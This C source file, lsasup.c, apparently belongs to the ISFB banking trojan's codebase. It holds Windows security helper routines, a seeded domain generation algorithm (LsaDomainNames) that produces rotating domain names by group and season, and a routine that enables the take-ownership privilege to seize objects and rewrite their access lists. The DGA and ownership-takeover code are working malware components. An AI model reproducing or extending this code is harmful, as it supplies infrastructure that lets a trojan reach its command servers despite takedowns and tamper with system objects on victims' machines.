//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: lsasup.c
// $Revision: 352 $
// $Date: 2014-09-24 20:47:14 +0400 (Ср, 24 сен 2014) $
// description:
//	 NT security support routines: user SID, ACL, SA and so on.

#define _ADVAPI_ALLOWED	TRUE

#include "common.h"
#include <accctrl.h>
#include <aclapi.h>

SECURITY_ATTRIBUTES		g_DefaultSA = {0};

#define		uDomainSeed			0xEDB98930
#define		DOMAIN_NAME_LEN_MIN		12	
#define		DOMAIN_NAME_LEN_MAX		24

#define		NUM_ACES				2

// If _ADVAPI_ALLOWED we can use a string formated DACL and initialize it using Advapi32!ConvertStringSecurityDescriptorToSecurityDescriptor
//  but when running from DLL advapi32 is not allowed (coz it's not initialized yet), so using predefined security descriptor.

// Default DACL string with the following access:
//     Built-in guests are denied all access.
//     Anonymous logon is denied all access.
//     Authenticated users are allowed 
//     read/write/execute access.
//     Administrators are allowed full control.
#ifndef _ADVAPI_ALLOWED

// The same DACL as in string but in initialized format: for use without advapi32.
static const unsigned char g_DefaultSD[] = {
	01, 00, 04, 0x80, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00,
    0x14, 00, 00, 00, 02, 00, 0x60, 00, 04, 00, 00, 00, 01, 03, 0x18, 00,
    00, 00, 00, 0x10, 01, 02, 00, 00, 00, 00, 00, 05, 0x20, 00, 00, 00,
	0x22, 02, 00, 00, 01, 03, 0x14, 00, 00, 00, 00, 0x10, 01, 01, 00, 00,
	00, 00, 00, 05, 07, 00, 00, 00, 00, 03, 0x14, 00, 00, 00, 00, 0x10,
	01, 01, 00, 00, 00, 00, 00, 05, 0x0b, 00, 00, 00, 00, 03, 0x18, 00,
	00, 00, 00, 0x10, 01, 02, 00, 00, 00, 00, 00, 05, 0x20, 00, 00, 00,
	0x20, 02, 00, 00 };
#endif


// Allocates a SECURITY_ATTRIBUTES structure with the default security descriptor desctibed above
BOOL LsaInitializeSecurityAttributes(PSECURITY_ATTRIBUTES pSa, LPTSTR DaclStr)
{
	BOOL Ret = TRUE;

	pSa->nLength = sizeof(SECURITY_ATTRIBUTES);
	pSa->bInheritHandle = FALSE;
#ifdef _ADVAPI_ALLOWED
	Ret = ConvertStringSecurityDescriptorToSecurityDescriptor(DaclStr, SDDL_REVISION_1, &pSa->lpSecurityDescriptor, NULL);
#else
	pSa->lpSecurityDescriptor = (LPVOID) &g_DefaultSD;
#endif
	
	return(Ret);
}

// Frees the default security descriptor previously allocated by the InitializeDefaultSecurityAttributes()
VOID LsaFreeSecurityAttributes(PSECURITY_ATTRIBUTES pSa)
{
#ifdef _ADVAPI_ALLOWED
	 LocalFree(pSa->lpSecurityDescriptor);
#else
	UNREFERENCED_PARAMETER(pSa);
#endif
}




#pragma warning(push)
#pragma warning(disable:4312)	// 'type cast' : conversion from 'DWORD' to 'HANDLE' of greater size

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates a buffer and extracts a string from the specified UNICODE_STRING structure into it.
//	Buffer should be freed by a caller.
//
LPTSTR LsaStringFromUnicodeString(PUNICODE_STRING puString)
{
	LPTSTR String = (LPTSTR)AppAlloc(puString->Length+sizeof(_TCHAR));
	if (String)
	{
		ULONG nChars = (puString->Length / sizeof(_TCHAR));
#if _UNICODE
		wcsncpy(String, puString->Buffer, nChars);
#else
		wcstombs(String, puString->Buffer, nChars);
#endif
		String[nChars] = 0;		// null terminating 
	}

	return(String);

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns a pointer to the current process SID structure.
//
BOOL LsaGetProcessUserSID(DWORD Pid, PNT_SID pSid)
{
	NTSTATUS ntStatus;
	HANDLE	hProcess;
	OBJECT_ATTRIBUTES oa = {0};
	CLIENT_ID ClientId = { (HANDLE)Pid, 0 };
	HANDLE	hToken;
	ULONG	rSize = 0;
	LPTSTR	SidStr = NULL;
	BOOL	Ret = FALSE;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	ntStatus = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &oa, &ClientId);
	
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (NT_SUCCESS(ntStatus))
		{
			PTOKEN_USER pUserInfo;
			ntStatus = ZwQueryInformationToken(hToken, TokenUser, NULL, 0, &rSize);

			pUserInfo = (PTOKEN_USER)AppAlloc(rSize);
			if (pUserInfo)
			{
				ntStatus = ZwQueryInformationToken(hToken, TokenUser, pUserInfo, rSize, &rSize);
				if (NT_SUCCESS(ntStatus))		
				{
					memcpy(pSid, pUserInfo->User.Sid, sizeof(NT_SID));
					Ret = TRUE;
				}
				AppFree(pUserInfo);
			}	// if (pUserInfo)
			ZwClose(hToken);
		}	// if (NT_SUCCESS(ntStatus))
		ZwClose(hProcess);
	}	// if (NT_SUCCESS(ntStatus))

	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates and returns a string with current user's SID
//  The string should be freed by the caller
//
LPTSTR LsaGetProcessUserSIDString(DWORD Pid)
{
	LPTSTR SidStr = NULL;
	NT_SID Sid;
	UNICODE_STRING uSidStr = {0};

	if (LsaGetProcessUserSID(Pid, &Sid))
	{
		if (NT_SUCCESS(RtlConvertSidToUnicodeString(&uSidStr, &Sid, TRUE)))
		{
			SidStr = LsaStringFromUnicodeString(&uSidStr);
			RtlFreeUnicodeString(&uSidStr);
		}
	}
	return(SidStr);
}


#pragma warning(pop)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Returns a DWORD Rid value from the specifed user SID string
//
DWORD LsaGetRIDFromSIDString(LPTSTR UserSid)
{
	ULONG i;
	ULONG SidLen = (ULONG)_tcslen(UserSid);
	DWORD Rid = 0;

	if (SidLen>sizeof(DWORD))
	{
		for (i=0;i<(sizeof(DWORD));i++)
		{
			UCHAR chr = *(PUCHAR)&UserSid[SidLen-i-1];
			if (chr==0x2d)
				chr=0x30;
			
			Rid += (ULONG)chr << ((sizeof(DWORD)-1-i) << 3);
		}
	}
	return(Rid);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates pseudo random number based on the specified seed value.
//	Since NtRandom on Vista returns process-specific results, we use this function to create inter-process common names.
//
ULONG LsaRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


// Generates a string of random characters of a random size
LPTSTR	LsaRndString(PULONG	pSeed, ULONG MinLength, ULONG MaxLength)
{
	ULONG	Size; 
	LPTSTR	String = NULL;

	if (MinLength != MaxLength && MinLength < MaxLength)
		Size = (LsaRandom(pSeed)%(MaxLength-MinLength) + MinLength);
	else
		Size = MinLength;

	if (String = AppAlloc((Size + 4 + 1)*sizeof(_TCHAR)))
	{
		ULONG i;
		for (i=0; i<Size; i++)
		{
			_TCHAR	s = (_TCHAR)(LsaRandom(pSeed)%(0x5a-0x30) + 0x30);
			if (s > 0x39 && s < 0x41)
				s = (_TCHAR)(LsaRandom(pSeed)%(0x5a-0x41) + 0x41);
			if (s > 0x40)
				s += 0x20;
			String[i] = s;
		}
		String[i] = 0;
	}	// if (String = AppAlloc((Size+1)*sizeof(_TCHAR)))
	return(String);
}



//
//	Generates list of Count pseudo-random domain names based on specified Group and Season.
//
BOOL WINAPI	LsaDomainNames(
	OUT LPTSTR	*NameList,		// List to store generated names
	IN	LPTSTR	Template,		// Any string of words devided by one ore more spaces ended with 0
	IN	LPTSTR	*ZoneList,		// Array of domain zones
	IN	ULONG	ZoneCount,		// Number of zones in the array
	IN	ULONG	Group,			// Group ID	[1..]
	IN	ULONG	Season,			// Season index [0..3]
	IN	ULONG	NameCount		// Nuber of names to generate
	)
{
	BOOL Ret = FALSE;
	ULONG	i,  Seed = uDomainSeed + (Group << 16) + Season;
	LPTSTR	NameStr = NULL;
	LPTSTR*	Words;
	ULONG	NumberWords = StringParseText(Template, 0, 3, &Words);

	for (i=0; i<NameCount; i++)
	{
		ULONG	ZoneIndex = LsaRandom(&Seed)%ZoneCount;
		if (!(NameStr = StringNameFromWords(&Seed, Words, NumberWords, DOMAIN_NAME_LEN_MIN, DOMAIN_NAME_LEN_MAX)))
			break;

		_tcscat(NameStr, (LPTSTR)ZoneList[ZoneIndex]);
		NameList[i] = NameStr;

		NameStr = NULL;
	}	// while(Count)

	if (i == NameCount)
		Ret = TRUE;

	return(Ret);
}


//
//	Enables or disables the specified privilege within the specified access token.
//
static BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
    ) 
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
		DbgPrint("ISFB: LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) )
    { 
		DbgPrint("ISFB: AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
		DbgPrint("ISFB: The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}



//
//	Takes ownership over the specfied object and grants FULL_CONTROL permission to it.
//
WINERROR LsaTakeOwnership(
	HANDLE	ObjectHandle,	// Handle to the object
	ULONG	ObjectType		// One of the SE_XXX constants, specifing valid object type
	) 
{

    HANDLE	hToken = NULL; 
    PSID	pSIDAdmin = NULL;
    PSID	pSIDEveryone = NULL;
    PACL	pACL = NULL;
	WINERROR Status = ERROR_UNSUCCESSFULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[NUM_ACES];

	do
	{
		// Specify the DACL to use.
		// Create a SID for the Everyone group.
		if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) 
		{
			DbgPrint("ISFB: AllocateAndInitializeSid (Everyone) failed\n");
			break;
		}

		// Create a SID for the BUILTIN\Administrators group.
		if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) 
		{
			DbgPrint("ISFB: AllocateAndInitializeSid (Admin) failed\n");
			break;
		}

		ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

		// Set read access for Everyone.
		ea[0].grfAccessPermissions = GENERIC_READ;
		ea[0].grfAccessMode = SET_ACCESS;
		ea[0].grfInheritance = NO_INHERITANCE;
		ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;

		// Set full control for Administrators.
		ea[1].grfAccessPermissions = GENERIC_ALL;
		ea[1].grfAccessMode = SET_ACCESS;
		ea[1].grfInheritance = NO_INHERITANCE;
		ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
		ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;

		if ((Status = SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL)) != NO_ERROR)
		{
			DbgPrint("ISFB: Failed SetEntriesInAcl\n");
			break;
		}

		// Try to modify the object's DACL.
		Status = SetSecurityInfo(
			ObjectHandle,				// name of the object
			ObjectType,					// type of object
			DACL_SECURITY_INFORMATION,  // change only the object's DACL
			NULL, NULL,                 // do not change owner or group
			pACL,                       // DACL specified
			NULL);                      // do not change SACL

		if (Status == NO_ERROR) 
		{
			DbgPrint("ISFB: Successfully changed DACL\n");
			// No more processing needed.
			break;
		}

		if (Status != ERROR_ACCESS_DENIED)
		{
			DbgPrint("ISFB: First SetNamedSecurityInfo call failed\n"); 
			break;
		}

		Status = ERROR_UNSUCCESSFULL;

		// If the preceding call failed because access was denied, 
		// enable the SE_TAKE_OWNERSHIP_NAME privilege, create a SID for 
		// the Administrators group, take ownership of the object, and 
		// disable the privilege. Then try again to set the object's DACL.

		// Open a handle to the access token for the calling process.
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			DbgPrint("ISFB: OpenProcessToken failed\n"); 
			break;
		} 

		// Enable the SE_TAKE_OWNERSHIP_NAME privilege.
		if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) 
		{
			DbgPrint("ISFB: You must be logged on as Administrator.\n");
			break;
		}

		// Set the owner in the object's security descriptor.
		Status = SetSecurityInfo(
			ObjectHandle,                 // name of the object
			ObjectType,		             // type of object
			OWNER_SECURITY_INFORMATION,  // change only the object's owner
			pSIDAdmin,                   // SID of Administrator group
			NULL,
			NULL,
			NULL); 

		if (Status != NO_ERROR) 
		{
			DbgPrint("ISFB: Could not set owner\n"); 
			break;
		}
	        
		// Disable the SE_TAKE_OWNERSHIP_NAME privilege.
		if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE)) 
		{
			DbgPrint("ISFB: Failed SetPrivilege call unexpectedly.\n");
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		// Try again to modify the object's DACL,
		// now that we are the owner.
		Status = SetSecurityInfo(
			ObjectHandle,                 // name of the object
			ObjectType,			         // type of object
			DACL_SECURITY_INFORMATION,   // change only the object's DACL
			NULL, NULL,                  // do not change owner or group
			pACL,                        // DACL specified
			NULL);                       // do not change SACL

		if (Status == NO_ERROR)
		{
			DbgPrint("ISFB: Successfully changed DACL\n");
		}
		else
		{
			DbgPrint("Second SetNamedSecurityInfo call failed\n"); 
		}

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	DbgPrint("ISFB: LsaTakeOwnership() finished with status %u\n", Status);

    if (pSIDAdmin)
        FreeSid(pSIDAdmin); 

    if (pSIDEveryone)
        FreeSid(pSIDEveryone); 

    if (pACL)
       LocalFree(pACL);

    if (hToken)
       CloseHandle(hToken);

    return(Status);
}
